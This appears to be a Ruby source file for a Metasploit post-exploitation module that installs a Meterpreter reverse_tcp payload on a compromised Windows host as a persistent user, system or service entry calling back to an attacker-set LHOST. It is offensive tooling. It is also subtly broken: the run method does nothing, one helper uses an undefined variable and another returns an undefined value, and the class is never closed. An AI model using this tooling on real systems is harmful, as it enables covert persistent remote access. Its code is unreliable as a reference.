##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Windows Meterpreter Service',
      'Description'   => %q{
        This Module will upload an executable to a remote host and make it Persistent.
        It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
        SYSTEM will start on system boot but requires privs. SERVICE will create a new service
        which will start the payload. Again requires privs.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
      'Version'       => '$Revision:1$',
      'Platform'      => [ 'windows' ],
      'SessionTypes'  => [ 'meterpreter']
    ))

    register_options(
      [
        OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into memory of a process.', "windows/meterpreter/reverse_tcp"]),
        OptAddressLocal.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
        OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
        OptBool.new('HANDLER', [ false, 'Start an exploit/multi/handler to receive the connection', false]),
        OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."])
      ])

    register_advanced_options(
      [
        OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),
        OptString.new('ServiceName',   [false, 'The name of service. Random string as default.' ]),
        OptString.new('ServiceDescription',   [false, 'The description of service. Random string as default.' ])
      ])

  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Set variables
    pay_name = datastore['PAYLOAD']
    lhost    = datastore['LHOST']
    lport    = datastore['LPORT']
    opts     = datastore['OPTIONS']
    lexepath = datastore['LocalExePath'] 
    @clean_up_rc = ""
  end

  def create_payload(name, lhost, lport, opts = "")
    pay = client.framework.payloads.create(name)

    pay
  end

  # Function for writing executable to target host
  # Code from post/windows/manage/persistence_exe
  #
  def write_exe_to_target(rexe, rexename)
    # check if we have write permission
    if lexepath

      begin
        temprexe = lexepath + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      rescue Rex::Post::Meterpreter::RequestError
        print_warning("Insufficient privileges to write in #{lexepath}, writing to %TEMP%")
        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      end

    # Write to %temp% directory if not set LocalExePath
    else
      temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
      write_file_to_target(temprexe,rexe)
    end

    print_good("Meterpreter service exe written to #{temprexe}")
    @clean_up_rc << "rm #{temprexe.gsub("\\", "\\\\\\\\")}\n"
    temprexe
  end


  def write_file_to_target(temprexe,rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end


  def meterpreter_source_code
    code

  end

  



